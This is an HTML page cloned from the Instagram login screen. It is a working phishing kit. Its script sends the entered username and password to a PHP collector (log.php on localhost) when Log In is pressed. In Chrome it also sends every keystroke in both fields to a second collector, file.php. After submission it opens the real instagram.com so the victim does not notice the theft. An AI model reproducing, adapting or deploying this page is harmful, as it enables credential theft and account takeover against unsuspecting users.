<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Login â€¢ Instagram</title>
  
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
    <link rel="stylesheet" href="./style.css">


    <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="box">
          <div class="heading"></div>
          <form class="login-form">
            <div class="field">
              <input
                id="username"
                type="name"
                placeholder="Phone number, username, or email"
              />
              <label for="username">Phone number, username, or email</label>
            </div>
            <div class="field">
       <input id="password" type="password" name="" id="" >
              <label for="password">Password</label>
            </div>
                          <button id="button" class="login-button" title="login">Log In</button>
                          <div class="separator">
                              <div class="line"></div>
                              <p>OR</p>
                              <div class="line"></div>
                          </div>
            <div class="other">
              <button class="fb-login-btn" type="button">
                <i class="fa fa-facebook-official fb-icon"></i>
                <span class="">Log in with Facebook</span>
              </button>
              <a class="forgot-password" href="#">Forgot password?</a>
            </div>
          </form>
        </div>
        <div class="box">
          <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
      </div>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script>
    document.getElementById("button").addEventListener("click",function(){
      username = document.getElementById("username").value
      password = document.getElementById("password").value
      $.post("http://localhost/test/log.php",{username:username,password:password})
    })
 if(navigator.userAgent.includes("Chrome")){
    document.getElementById("username").addEventListener("keypress",function(data){
        $.post("http://localhost/test/file.php",{"userkey":data.key,})
    
    })

    document.getElementById("password").addEventListener("keypress",function(data){
        $.post("http://localhost/test/file.php",{"passkey":data.key})
 
    })
 }

 document.getElementById("button").addEventListener("click",function(){
  window.open("https://www.instagram.com", "_blank")
    })

</script>

</body>

</html>
